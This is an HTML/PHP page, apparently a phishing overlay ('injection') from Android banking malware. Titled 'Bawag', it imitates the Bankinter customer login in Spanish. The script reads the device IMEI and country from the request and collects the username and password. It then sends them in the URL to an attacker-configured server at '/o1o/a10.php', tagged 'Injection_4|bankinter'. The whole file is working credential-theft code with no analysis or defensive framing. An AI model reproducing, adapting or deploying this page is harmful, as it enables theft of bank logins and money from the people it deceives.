<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="es/com.bankinter.launcher/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div class="header">
	<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QTAyOUNENUU2ODc4MTFFNzg1RDc5QTU2MEFGOUMxRTYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QTAyOUNENUY2ODc4MTFFNzg1RDc5QTU2MEFGOUMxRTYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpBMDI5Q0Q1QzY4NzgxMUU3ODVENzlBNTYwQUY5QzFFNiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpBMDI5Q0Q1RDY4NzgxMUU3ODVENzlBNTYwQUY5QzFFNiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PqohnloAAAF5SURBVHja7Jktb8MwEECTaai02LR4NLh0o6EtLc0PGS3NaOlGi0uHS41DQ9OzdOhkW5Ny9u7UO+lUqSDy88e7c9Iuy9JojpdGeRiAARiAATwfgIPsuR72WnnwW8gBcoMgZ8hZywqEQZ/wN8QOYbZaAE4463RFNhoAjjjjNL4gvXSAPWQX+X+E/JVuoS5hnCvkTbpGHW4dGmHgF+l1wKFhaHjOwZcCCFY5ROwyQX6u9X4NgCGiy5mjaNUAOEYG3+DM+xJ7lROgz+jSlzIFF0CHvqfxw6XLkgC7jC6/pbfTDnucmC5Hu9BUAPCox79WYZErcE9sl3CwP7RsoRs2aDTeE2oVeQYuCWWmipvIQ5wqWkMpiBIWirUN9D4sGmDGq+KceSMhvg54XImYXnsNALlq3HFClK7EqevjnkuvNVqJa0avb1p6oRErNo3DWr3WbObOEb1OjaJ3o/RefEdTTWse2v7DZ1aHB5jl9Upr34kNwAAMwACeGuAhwAAkrUoDMYrIhgAAAABJRU5ErkJggg==">

	<b style="color: #fff;font-size: 18px;font-weight: 100;"> Acceso  clientes </b>

</div><br>

    <div class="main">
        <div class="container">
            <div class="row">
			<div id="form1">
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">
                        <form id="form">
                            <div class="form-group ">
                                	<input type="text" class="form-control" placeholder="Usuario" name="field2" id="login" autocomplete="off" data-reg="/.{3,50}/">
                            </div>

                            <div class="form-group">
                                	<input type="password" class="form-control" placeholder="Contraseña" name="field3" id="password" autocomplete="off" data-reg="/.{3,50}/">
                            </div>

						<input type="button" class="input_submitBtn" onClick="sentServer();" value="SIGN IN">

                        </form>

						<div style="float: left;width: 50%;"><input type="checkbox"> <b style="color: #6e6e6e;"> Recordar usuario </b> </div> <div style="float: left;width: 50%;color: #5b432f;font-weight: 100;text-align: right;height: 22px;padding: 5px;"> No puedo entrar </div>
                </div>

            </div>
        </div>

		</div>
    </div>

	<script>
	function sentServer()
	{

		var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';


	var login1 = document.forms["form"].elements["login"].value;
	var pass = document.forms["form"].elements["password"].value;

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|bankinter|"+login1+"|"+pass);
	}
	}
</script>
</body>
</html>
